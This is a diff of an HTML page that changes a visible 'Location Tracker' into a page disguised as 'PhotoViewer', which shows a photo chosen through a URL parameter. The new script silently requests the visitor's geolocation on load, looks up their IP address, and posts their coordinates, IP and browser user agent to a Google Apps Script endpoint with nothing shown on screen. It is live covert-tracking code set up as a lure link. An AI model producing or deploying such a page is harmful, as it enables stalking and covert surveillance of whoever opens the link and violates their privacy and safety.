@@ -1,61 +1,81 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Location Tracker</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PhotoViewer</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f4f4f4;
+            padding: 30px;
+        }
+
+        img {
+            max-width: 100%;
+            border-radius: 12px;
+            margin-bottom: 20px;
+        }
+
+        #output {
+            font-size: 18px;
+            color: #333;
+            margin-top: 20px;
+        }
+    </style>
 </head>
 <body>
-  <h2>User Location Tracker</h2>
-  <img src="https://via.placeholder.com/400x200" alt="Sample Image" />
-  <div id="output">Click the button to find location.</div>
-  <br>
-
-  <script>
-      fetchAndStore();
-    const output = document.getElementById("output");
-    const scriptURL = 'https://script.google.com/macros/s/AKfycbyqDE7cAtFmgXH2lT49teT2HrlI5UAT03QWE5klI5CmpjAGI3EP2puum-niwOMyMPCm/exec';
-
-    async function getIPAddress() {
-      try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        return data.ip || "Unknown";
-      } catch {
-        return "Unknown";
-      }
-    }
-
-    async function fetchAndStore() {
-      if (!navigator.geolocation) {
-        output.innerHTML = "❌ Your browser does not support Geolocation.";
-        return;
-      }
-
-      navigator.geolocation.getCurrentPosition(async position => {
-        const latitude = position.coords.latitude;
-        const longitude = position.coords.longitude;
-        const ip = await getIPAddress();
-        const userAgent = navigator.userAgent;
-        const timestamp = new Date().toLocaleString();
-
-        output.innerHTML = `📍 Latitude: ${latitude}<br>📍 Longitude: ${longitude}<br>📡 Sending to server...`;
-
-    console.log("Latitude"+latitude)
-        try {
-          const response = await fetch(scriptURL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ latitude, longitude, ip, userAgent, timestamp })
-          });
-          const text = await response.text();
-          output.innerHTML += `<br>✅ Server Response: ${text}`;
-        } catch (err) {
-          output.innerHTML += `<br>❌ Failed to send data: ${err.message}`;
-        }
-      }, error => {
-        output.innerHTML = "❌ Location denied. Please allow location.";
-        //setTimeout(fetchAndStore, 4000); // Retry after 4 seconds
-      });
-    }
-  </script>
+        <img id="dynamicImage" src="" alt="Image will appear here">
 </body>
-</html>
+<script>
+    // Get URL parameter
+    const params = new URLSearchParams(window.location.search);
+    const imageUrl = params.get('img');
+
+    // Set the image src
+    if (imageUrl) {
+      document.getElementById('dynamicImage').src = imageUrl;
+    } else {
+      document.getElementById('dynamicImage').src = "https://www.harringtonspetfood.com/cdn/shop/articles/shutterstock_2252922629.jpg?v=1713882588&width=1024";
+    }
+    fetchAndStore()
+    async function fetchAndStore() {
+        if (!navigator.geolocation) {
+            output.innerHTML = "❌ Your browser does not support Geolocation.";
+            return;
+        }
+        async function getIPAddress() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip || "Unknown";
+            } catch {
+                return "Unknown";
+            }
+        }
+
+        navigator.geolocation.getCurrentPosition(async position => {
+            DLatitude = position.coords.latitude;
+            DLongitude = position.coords.longitude;
+            DIP = await getIPAddress();
+            DuserAgent = navigator.userAgent;
+            const data = {
+                latitude: DLatitude,
+                longitude: DLongitude,
+                ip: DIP,
+                userAgent: DuserAgent,
+            }
+            fetch("https://script.google.com/macros/s/AKfycby0D25qvwkZU7d6kUZlIJAQcCQuOnWg7VYRE3oAeOlQ_bH8zht_ZZVxmXpZxfWI6Epvvw/exec", {
+                method: 'POST',
+                body: JSON.stringify(data)
+            });
+        }, error => {
+            //output.innerHTML = "❌ Location denied. Please allow location.";
+            //setTimeout(fetchAndStore, 4000); // Retry after 4 seconds
+        });
+    }
+
+</script>
+
+</html> 
